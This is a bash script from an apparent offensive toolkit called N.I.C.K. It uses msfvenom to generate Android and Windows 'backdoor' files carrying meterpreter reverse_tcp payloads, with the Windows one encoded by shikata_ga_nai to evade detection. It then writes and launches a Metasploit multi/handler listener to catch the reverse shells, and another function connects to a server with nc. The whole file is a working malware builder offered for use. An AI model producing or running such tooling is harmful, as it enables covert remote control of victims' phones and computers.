#!/bin/bash

#    This file is part of N.I.C.K.

#    N.I.C.K is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.

#    N.I.C.K is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.

#    You should have received a copy of the GNU General Public License
#    along with N.I.C.K.  If not, see <http://www.gnu.org/licenses/>.


BOLD='\e[32;1m'
PLN='\e[0m'
RED='\033[32;31m'
GRN='\033[0;32m'
NC='\033[0m'
BLU='\033[1;34m'


printf "\n" 
ser_fun()
{
  server_ip=$(sed -n '1p' $PWD/server/server_info.txt)
  server_port=4445
  nc $server_ip $server_port ;
}

listener()
{
  echo -e "\n${BOLD}${RED}Starting the listner... Please Wait..${NC}${PLN}"
  service postgresql start;
  xterm -title Listner -e msfconsole -r metaconfig 
}
dev_fun()
{
  echo -e "[+] Press 1 to generate payload for ${GRN}android${NC}"
  echo -e "[+] Press 2 to generate payload for ${GRN}windows${NC}\n"
  read opt;
  dev_ip=$(hostname -I)
  printf "\n[+] Enter the ${GRN}port${NC} you want to listen to  :- "
  read dev_port;
  printf "[+] Enter the ${GRN}path${NC} to store backdoor :- "
  read dev_path;
  printf "[+] Enter a ${GRN}name${NC} for the backdoor :- "
  read file_name;

  if [ $opt -eq 1 ]
  then
    apk_backdoor;
  elif [ $opt -eq 2 ]
  then
    exe_backdoor;
  else
    echo -e "${RED}Wrong Input${NC}"
    ./inf_media.sh;
  fi
  echo -e "\n[+] Do you want to start a ${GRN}listener${NC} now !!! ${RED}(yes/no)${NC}"
  read lis_ans
  if [ $lis_ans == "yes" ]
  then
    listener
  fi
}

apk_backdoor()
{
  msfvenom -p android/meterpreter/reverse_tcp LHOST=$dev_ip LPORT=$dev_port R> $dev_path/$file_name
  echo -e "use multi/handler\nset payload android/meterpreter/reverse_tcp\nset LHOST $dev_ip\nset LPORT $dev_port\nset ExitOnSession false\nexploit -j" > metaconfig;
}


exe_backdoor()
{
  msfvenom -a x86 --platform windows -k -p windows/meterpreter/reverse_tcp LHOST=$dev_ip LPORT=$dev_port-e x86/shikata_ga_nai -i 3 -b "\x00" > $dev_path/$file_name
  echo -e "use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LHOST $dev_ip\nset LPORT $dev_port\nset ExitOnSession false\nexploit -j" > metaconfig;
}

  ser_sta=$(sed -n '5p' $PWD/server/server_status.txt)
  check="Success"
  if [ "$ser_sta" == "$check" ];
  then
    ser_fun;
  else
    dev_fun;
  fi
